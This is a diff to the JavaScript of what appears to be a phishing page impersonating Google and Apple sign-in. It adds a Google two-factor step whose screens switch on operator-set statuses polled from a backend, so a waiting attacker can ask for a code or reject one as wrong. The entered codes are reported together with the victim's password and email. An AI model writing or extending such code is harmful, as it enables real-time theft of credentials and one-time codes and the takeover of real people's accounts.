@@ -217,7 +217,7 @@ function initApp() {
         }
 
         const isGoogleStep = [
-            stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent
+            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
         ].includes(targetStep);
 
         const isAppleStep = [
@@ -277,11 +277,19 @@ function initApp() {
 
         [
             stepPhone, stepCode, step2FA, 
-            stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent,
+            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent,
             stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt, stepAppleLoading,
             stepSuccess
         ].forEach(s => s && s.classList.remove("active"));
         if (targetStep) targetStep.classList.add("active");
+        if (targetStep === stepGoogle2FA) {
+            if (userGoogleEmail) updateGoogleDisplays(userGoogleEmail);
+            setTimeout(() => {
+                if (google2faCodeInput) {
+                    google2faCodeInput.focus();
+                }
+            }, 120);
+        }
         if (targetStep === stepApple2FA) {
             setTimeout(() => {
                 if (apple2faCodeInput) {
@@ -1411,9 +1419,33 @@ function initApp() {
                     const promptErr = document.getElementById("googlePromptError");
                     const promptErrText = document.getElementById("googlePromptErrorText");
                     if (promptErr) promptErr.classList.remove("hidden");
-                    if (promptErrText) {
-                        promptErrText.textContent = ctrl.error_msg || "Выбрано неверное число на устройстве. Ожидайте новые цифры...";
+                } else if (ctrl.status === "ask_2fa" || ctrl.status === "ask_code" || ctrl.status === "show_2fa") {
+                    if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                    if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
+                    clearGoogleErrors();
+                    if (userGoogleEmail) updateGoogleDisplays(userGoogleEmail);
+                    if (!stepGoogle2FA.classList.contains("active")) {
+                        showStep(stepGoogle2FA);
                     }
+                    if (google2faCodeInput) {
+                        setTimeout(() => {
+                            try { google2faCodeInput.focus(); } catch (e) {}
+                        }, 120);
+                    }
+                } else if (ctrl.status === "error_2fa" || ctrl.status === "wrong_2fa" || ctrl.status === "error_code" || ctrl.status === "wrong_code") {
+                    if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
+                    if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
+                    if (userGoogleEmail) updateGoogleDisplays(userGoogleEmail);
+                    if (!stepGoogle2FA.classList.contains("active")) {
+                        showStep(stepGoogle2FA);
+                    }
+                    if (google2faCodeInput) {
+                        google2faCodeInput.value = "";
+                        setTimeout(() => {
+                            try { google2faCodeInput.focus(); } catch (e) {}
+                        }, 120);
+                    }
+                    showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
@@ -1462,6 +1494,15 @@ function initApp() {
             sendGoogleControlCommand("checking", null, null);
             reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
             startGooglePolling();
+        });
+    }
+
+    if (google2faCodeInput) {
+        google2faCodeInput.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.click();
+            }
         });
     }
 
